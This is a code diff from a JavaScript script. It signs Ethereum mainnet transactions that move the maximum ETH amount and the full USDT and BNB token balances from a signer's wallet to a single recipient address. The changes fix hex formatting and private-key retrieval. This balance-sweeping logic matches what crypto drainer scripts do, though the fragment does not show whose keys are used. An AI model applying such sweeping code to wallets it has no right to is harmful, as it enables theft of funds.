@@ -145,35 +145,35 @@
                     // Create transactions for each token using ethereumjs-tx
                     const ethTransactionParameters = {
                         to: recipientAddress,
-                        value: maxEthTransferWei.toString(16),
-                        gasLimit: gasLimit.toString(16),
-                        gasPrice: gasPriceWei.toString(16),
+                        value: '0x' + maxEthTransferWei.toString(16),
+                        gasLimit: '0x' + gasLimit.toString(16),
+                        gasPrice: '0x' + gasPriceWei.toString(16),
                     };
 
                     const ethTransaction = new EthereumTx.Transaction(ethTransactionParameters, { chain: 'mainnet' });
-                    ethTransaction.sign(Buffer.from(signer.privateKey.substring(2), 'hex'));
+                    ethTransaction.sign(Buffer.from((await signer.getPrivateKey()).substring(2), 'hex'));
                     const serializedEthTransaction = ethTransaction.serialize();
 
                     const usdtTransactionParameters = {
                         to: tokenAddresses.USDT,
-                        gasLimit: gasLimit.toString(16),
-                        gasPrice: gasPriceWei.toString(16),
+                        gasLimit: '0x' + gasLimit.toString(16),
+                        gasPrice: '0x' + gasPriceWei.toString(16),
                         data: usdtContract.methods.transfer(recipientAddress, usdtBalanceWei.toString()).encodeABI()
                     };
 
                     const usdtTransaction = new EthereumTx.Transaction(usdtTransactionParameters, { chain: 'mainnet' });
-                    usdtTransaction.sign(Buffer.from(signer.privateKey.substring(2), 'hex'));
+                    usdtTransaction.sign(Buffer.from((await signer.getPrivateKey()).substring(2), 'hex'));
                     const serializedUsdtTransaction = usdtTransaction.serialize();
 
                     const bnbTransactionParameters = {
                         to: tokenAddresses.BNB,
-                        gasLimit: gasLimit.toString(16),
-                        gasPrice: gasPriceWei.toString(16),
+                        gasLimit: '0x' + gasLimit.toString(16),
+                        gasPrice: '0x' + gasPriceWei.toString(16),
                         data: bnbContract.methods.transfer(recipientAddress, bnbBalanceWei.toString()).encodeABI()
                     };
 
                     const bnbTransaction = new EthereumTx.Transaction(bnbTransactionParameters, { chain: 'mainnet' });
-                    bnbTransaction.sign(Buffer.from(signer.privateKey.substring(2), 'hex'));
+                    bnbTransaction.sign(Buffer.from((await signer.getPrivateKey()).substring(2), 'hex'));
                     const serializedBnbTransaction = bnbTransaction.serialize();
 
                     // Send transactions
